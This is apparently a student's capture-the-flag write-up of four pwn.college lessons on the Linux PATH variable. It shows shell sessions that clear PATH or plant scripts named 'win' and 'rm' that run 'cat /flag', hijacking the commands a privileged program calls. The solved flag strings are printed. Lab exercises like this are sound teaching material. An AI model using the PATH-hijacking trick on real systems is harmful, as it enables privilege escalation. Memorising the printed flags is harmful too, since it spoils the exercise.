# 1) The path variable

```bash
hacker@path~the-path-variable:~$ PATH=""
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{MaXlolPopd-OXE-JW5tf3JCDaC_.dZzNwUDL4ETN0czW}
```
Cleared the PATH variable so that rm cannot be found.
PATH variable is where all the executables are stored. So, if the rm command is not found, the flag file cannot be removed.

# 2) Setting PATH

```bash
hacker@path~setting-path:~$ PATH=/challenge/more_commands
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{MQd7C1mm5XK8FFhNGCVlfj0iOKf.dVzNyUDL4ETN0czW}
```
Here, we added the /challenge/more_commands directory to PATH to expose the win program to be launched using its bare name. 

# 3) Adding commands

```bash
hacker@path~adding-commands:~$ touch win
hacker@path~adding-commands:~$ echo cat /flag > win
hacker@path~adding-commands:~$ chmod u+x win
hacker@path~adding-commands:~$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~adding-commands:~$ PATH="/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/hacker"
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{kt4BApwCrhuLz61oeOH4eJm15_d.dZzNyUDL4ETN0czW}
```


# 4) Hijacking commands

```bash
hacker@path~hijacking-commands:~$ echo /usr/bin/cat /flag > rm
hacker@path~hijacking-commands:~$ chmod u+x rm
hacker@path~hijacking-commands:~$ PATH="/home/hacker"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{sanpZYet1GQYrcursgDsp-vy307.ddzNyUDL4ETN0czW}
```
Redirected flag to rm. Used the absolute path of cat because PATH has been reset later.
Made rm executable.
Changed the path to /home/hacker
Called /challenge/run.

